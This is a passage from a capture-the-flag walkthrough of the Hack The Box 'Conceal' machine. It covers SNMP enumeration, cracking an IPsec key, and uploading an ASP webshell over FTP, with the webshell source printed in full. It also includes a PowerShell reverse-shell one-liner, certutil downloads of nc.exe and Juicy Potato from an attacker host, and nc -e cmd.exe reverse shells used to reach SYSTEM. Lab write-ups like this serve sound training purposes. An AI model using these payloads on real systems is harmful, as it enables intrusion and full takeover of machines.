Windows Event Log</span><br><span class="line">|   Windows Firewall</span><br><span class="line">|   Windows Font Cache Service</span><br><span class="line">|   Windows Management Instrumentation</span><br><span class="line">|   Windows Process Activation Service</span><br><span class="line">|   Windows Push Notifications System Service</span><br><span class="line">|   Windows Search</span><br><span class="line">|   Windows Time</span><br><span class="line">|   Workstation</span><br><span class="line">|_  World Wide Web Publishing Service</span><br><span class="line">| snmp-win32-software: </span><br><span class="line">|   Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161; 2018-10-12T20:10:30</span><br><span class="line">|   Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161; 2018-10-12T20:10:22</span><br><span class="line">|_  VMware Tools; 2018-10-12T20:11:02</span><br><span class="line">| snmp-win32-users: </span><br><span class="line">|   Administrator</span><br><span class="line">|   DefaultAccount</span><br><span class="line">|   Destitute</span><br><span class="line">|_  Guest</span><br><span class="line">500&#x2F;udp open  isakmp  Microsoft Windows 8</span><br><span class="line">| ike-version: </span><br><span class="line">|   vendor_id: Microsoft Windows 8</span><br><span class="line">|   attributes: </span><br><span class="line">|     MS NT5 ISAKMPOAKLEY</span><br><span class="line">|     RFC 3947 NAT-T</span><br><span class="line">|     draft-ietf-ipsec-nat-t-ike-02\n</span><br><span class="line">|     IKE FRAGMENTATION</span><br><span class="line">|     MS-Negotiation Discovery Capable</span><br><span class="line">|_    IKE CGA version 1</span><br><span class="line">Service Info: Host: Conceal; OS: Windows 8; CPE: cpe:&#x2F;o:microsoft:windows:8, cpe:&#x2F;o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line"># Nmap done at Fri May 17 16:42:05 2019 -- 1 IP address (1 host up) scanned in 253.58 seconds</span><br></pre></td></tr></table></figure>
<p>We have two services to enumerate. <code>isakmp</code> which is <code>IPSEC</code> and <code>snmp</code>.</p>
<h2 id="Snmp-Enumeration"><a href="#Snmp-Enumeration" class="headerlink" title="Snmp Enumeration"></a>Snmp Enumeration</h2><p>I started with <code>snmpwalk</code> :<br><code>snmpwalk -c public -v 1 conceal.htb</code><br>The output was very long but we only need this first part :<br><img src="/images/hackthebox/conceal/5.png" alt=""><br>We have a password hash for the <code>IPSEC</code> connection : <code>9C8B1A372B1878851BE2C097031B6E43</code><br>I used <a href="https://crackstation.net/" target="_blank" rel="noopener">crackstation</a> to crack it and I got this result :<br><img src="/images/hackthebox/conceal/6.png" alt=""><br>Great ! Now we need to enumerate the <code>ike</code> vpn service to know how to connect to it. </p>
<h2 id="ike-scan-Setting-up-The-Connection"><a href="#ike-scan-Setting-up-The-Connection" class="headerlink" title="ike-scan, Setting up The Connection"></a><code>ike-scan</code>, Setting up The Connection</h2><p>I ran <code>ike-scan</code> and got these results :<br><img src="/images/hackthebox/conceal/7.png" alt=""><br>I installed <code>strongswan</code> to set up the <code>IPSEC</code> connection. With the help of the info I got from <code>ike-scan</code> and some guessing I could come up with this configuration which worked :<br><code>/etc/ipsec.conf</code> :<br><img src="/images/hackthebox/conceal/8.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">conn rick-to-conceal</span><br><span class="line">        authby&#x3D;secret</span><br><span class="line">        auto&#x3D;route</span><br><span class="line">        keyexchange&#x3D;ikev1</span><br><span class="line">        ike&#x3D;3des-sha1-modp1024</span><br><span class="line">        left&#x3D;10.10.xx.xx</span><br><span class="line">        right&#x3D;10.10.10.116</span><br><span class="line">        type&#x3D;transport</span><br><span class="line">        esp&#x3D;3des-sha1</span><br><span class="line">        rightprotoport&#x3D;tcp</span><br></pre></td></tr></table></figure>
<p><code>/etc/ipsec.secrets</code> :<br><img src="/images/hackthebox/conceal/9.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.xx.xx 10.10.10.116 : PSK &quot;Dudecake1!&quot;</span><br></pre></td></tr></table></figure>
<p>I started <code>ipsec</code> then I initialized the connection :<br><code>ipsec start</code><br><code>ipsec up rick-to-conceal</code><br><img src="/images/hackthebox/conceal/10.png" alt=""><br>It worked fine, now we are connected to a vpn network let’s see what new services can we get.</p>
<h2 id="Nmap-Second-Time"><a href="#Nmap-Second-Time" class="headerlink" title="Nmap (Second Time)"></a>Nmap (Second Time)</h2><p><code>nmap -sV -sT -sC conceal.htb</code><br><img src="/images/hackthebox/conceal/11.png" alt=""><br>We got ftp on port 21 , http on port 80 and smb on port 445. I wanted to check ftp first and see if I can authenticate anonymously.</p>
<h2 id="FTP-File-Upload-Reverse-Shell-and-User-Flag"><a href="#FTP-File-Upload-Reverse-Shell-and-User-Flag" class="headerlink" title="FTP, File Upload, Reverse Shell and User Flag"></a>FTP, File Upload, Reverse Shell and User Flag</h2><p><img src="/images/hackthebox/conceal/12.png" alt=""><br>It worked but there was literally nothing on that ftp server. I uploaded a test file to check if I have write permissions on that ftp server and I had.<br><img src="/images/hackthebox/conceal/13.png" alt=""><br>I Checked the http service and there was only the default IIS page :<br><img src="/images/hackthebox/conceal/14.png" alt=""><br>I ran <code>gobuster</code> with <code>/usr/share/wordlists/dirb/common.txt</code> and got only one directory called <code>/upload</code> : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">gobuster -u http:&#x2F;&#x2F;conceal.htb&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v2.0.0              OJ Reeves (@TheColonial)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Mode         : dir</span><br><span class="line">[+] Url&#x2F;Domain   : http:&#x2F;&#x2F;conceal.htb&#x2F;</span><br><span class="line">[+] Threads      : 10</span><br><span class="line">[+] Wordlist     : &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt</span><br><span class="line">[+] Status codes : 200,204,301,302,307,403</span><br><span class="line">[+] Timeout      : 10s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;05&#x2F;17 17:18:57 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;upload (Status: 301)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;05&#x2F;17 17:28:23 Finished</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
<p>I went to <code>/upload</code> and found my test file :<br><img src="/images/hackthebox/conceal/15.png" alt=""><br>Great ! I uploaded an <code>asp</code> shell to get remote code execution :<br><img src="/images/hackthebox/conceal/16.png" alt=""><br><code>shell.asp</code> : </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">ASP Webshell</span></span><br><span class="line"><span class="comment">Working on latest IIS </span></span><br><span class="line"><span class="comment">Referance :- </span></span><br><span class="line"><span class="comment">https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp</span></span><br><span class="line"><span class="comment">http://stackoverflow.com/questions/11501044/i-need-execute-a-command-line-in-a-visual-basic-script</span></span><br><span class="line"><span class="comment">http://www.w3schools.com/asp/</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">%</span></span></span><br><span class="line"><span class="tag"><span class="attr">Set</span> <span class="attr">oScript</span> = <span class="string">Server.CreateObject(</span>"<span class="attr">WSCRIPT.SHELL</span>")</span></span><br><span class="line"><span class="tag"><span class="attr">Set</span> <span class="attr">oScriptNet</span> = <span class="string">Server.CreateObject(</span>"<span class="attr">WSCRIPT.NETWORK</span>")</span></span><br><span class="line"><span class="tag"><span class="attr">Set</span> <span class="attr">oFileSys</span> = <span class="string">Server.CreateObject(</span>"<span class="attr">Scripting.FileSystemObject</span>")</span></span><br><span class="line"><span class="tag"><span class="attr">Function</span> <span class="attr">getCommandOutput</span>(<span class="attr">theCommand</span>)</span></span><br><span class="line"><span class="tag">    <span class="attr">Dim</span> <span class="attr">objShell</span>, <span class="attr">objCmdExec</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Set</span> <span class="attr">objShell</span> = <span class="string">CreateObject(</span>"<span class="attr">WScript.Shell</span>")</span></span><br><span class="line"><span class="tag">    <span class="attr">Set</span> <span class="attr">objCmdExec</span> = <span class="string">objshell.exec(thecommand)</span></span></span><br><span class="line"><span class="tag">    <span class="attr">getCommandOutput</span> = <span class="string">objCmdExec.StdOut.ReadAll</span></span></span><br><span class="line"><span class="tag"><span class="attr">end</span> <span class="attr">Function</span></span></span><br><span class="line"><span class="tag">%&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">FORM</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"cmd"</span> <span class="attr">size</span>=<span class="string">45</span> <span class="attr">value</span>=<span class="string">"&lt;%= szCMD %&gt;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Run"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">FORM</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PRE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%=</span> "\\" &amp; <span class="attr">oScriptNet.ComputerName</span> &amp; "\" &amp; <span class="attr">oScriptNet.UserName</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%Response.Write(Request.ServerVariables("server_name"))%</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>The server's port:<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%Response.Write(Request.ServerVariables("server_port"))%</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>The server's software:<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%Response.Write(Request.ServerVariables("server_software"))%</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>The server's software:<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%</span> <span class="attr">szCMD</span> = <span class="string">request(</span>"<span class="attr">cmd</span>")</span></span><br><span class="line"><span class="tag"><span class="attr">thisDir</span> = <span class="string">getCommandOutput(</span>"<span class="attr">cmd</span> /<span class="attr">c</span>" &amp; <span class="attr">szCMD</span>)</span></span><br><span class="line"><span class="tag"><span class="attr">Response.Write</span>(<span class="attr">thisDir</span>)%&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/conceal/17.png" alt=""><br><img src="/images/hackthebox/conceal/18.png" alt=""><br>I got a powershell reverse shell :<br><img src="/images/hackthebox/conceal/19.png" alt=""><br>Payload : </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-nop</span> <span class="literal">-c</span> <span class="string">"<span class="variable">$client</span> = New-Object System.Net.Sockets.TCPClient('10.10.xx.xx',1337);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + 'PS ' + (pwd).Path + '&gt; ';<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()"</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/conceal/20.png" alt=""><br>We got user.</p>
<h2 id="SeImpersonatePrivilege-Juicy-Potato-Privilege-Escalation-and-Root-Flag"><a href="#SeImpersonatePrivilege-Juicy-Potato-Privilege-Escalation-and-Root-Flag" class="headerlink" title="SeImpersonatePrivilege, Juicy Potato, Privilege Escalation and Root Flag"></a>SeImpersonatePrivilege, Juicy Potato, Privilege Escalation and Root Flag</h2><p>After getting user the privilege escalation is easy and straightforward. Before doing any enumeration I checked my privileges as <code>Destitute</code> and I found that I had the <code>SeImpersonatePrivilege</code>.<br><img src="/images/hackthebox/conceal/21.png" alt=""><br>This means that we can apply the famous attack <code>Juicy Potato</code>. You can read about it on the <a href="https://github.com/ohpe/juicy-potato" target="_blank" rel="noopener">official github repository</a>. We need to know the version of this windows to pick the right <code>clsid</code>.<br><code>systeminfo</code><br><img src="/images/hackthebox/conceal/22.png" alt=""><br>It’s <code>Microsoft Windows 10 Enterprise</code>. I got the <code>clsid</code> of  <code>wuauserv</code> from <a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise" target="_blank" rel="noopener">here</a> which is :<br><code>{e60687f7-01a1-40aa-86ac-db1cbf673334}</code><br>I got a compiled binary of <code>Juicy Potato</code> from the github repository. I hosted it on a python simple http server then I downloaded it on the machine with <code>certutil</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;10.10.xx.xx&#x2F;juicypotato.exe juicypotato.exe</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/conceal/23.png" alt=""><br>However I had some problems with my powershell reverse shell and it couldn’t run <code>juicypotato.exe</code> properly so I got another <code>cmd</code> shell with <code>nc</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;10.10.xx.xx&#x2F;nc.exe nc.exe</span><br></pre></td></tr></table></figure>
<p><code>nc.exe -e cmd.exe 10.10.xx.xx 1339</code><br><img src="/images/hackthebox/conceal/24.png" alt=""><br><img src="/images/hackthebox/conceal/25.png" alt=""><br>I created a <code>bat</code> file that executes : <code>nc.exe -e cmd.exe 10.10.xx.xx 1340</code> to get me a reverse shell :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo C:\users\Destitute\appdata\local\temp\nc.exe -e cmd.exe 10.10.xx.xx 1340 &gt; rev.bat</span><br></pre></td></tr></table></figure>
<p>Then I ran <code>juicypotato.exe</code> and made it execute that <code>bat</code> file :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">juicypotato.exe -p C:\users\Destitute\appdata\local\temp\rev.bat -l 1340 -t * -c &#123;e60687f7-01a1-40aa-86ac-db1cbf673334&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/conceal/26.png" alt=""><br>It worked fine and we got a reverse shell as <code>nt authority\system</code><br><img src="/images/hackthebox/conceal/27.png" alt=""><br><img src="/images/hackthebox/conceal/28.png" alt=""><br>And we owned root !</p>
<p>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Hack The Box write-up : <a href="/hack-the-box/lightweight/">Hack The Box - Lightweight</a><br>Next Hack The Box write-up : <a href="/hack-the-box/chaos/">Hack The Box - Chaos</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-05-18</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/ftp/" rel="tag">#ftp</a> <a class="tag-link" href="/tags/networking/" rel="tag">#networking</a> <a class="tag-link" href="/tags/rce/" rel="tag">#rce</a> <a class="tag-link" href="/tags/web/" rel="tag">#web</a> <a class="tag-link" href="/tags/windows/" rel="tag">#windows</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
